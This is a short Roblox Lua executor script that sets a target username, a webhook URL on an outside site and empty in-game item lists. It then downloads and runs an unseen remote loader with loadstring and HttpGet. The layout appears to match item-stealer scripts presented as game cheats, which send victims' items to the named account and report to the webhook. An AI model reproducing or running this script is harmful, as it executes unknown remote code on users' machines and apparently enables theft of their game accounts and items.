-- Mode: NORMAL
getgenv().TARGET_USERNAME = "THANOSSQUID15"
getgenv().WEBHOOK_URL = "https://oblivionhub.xyz/api/paste?id=b1c7d941d033d875ae2f69c2762bd65c&raw=true"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)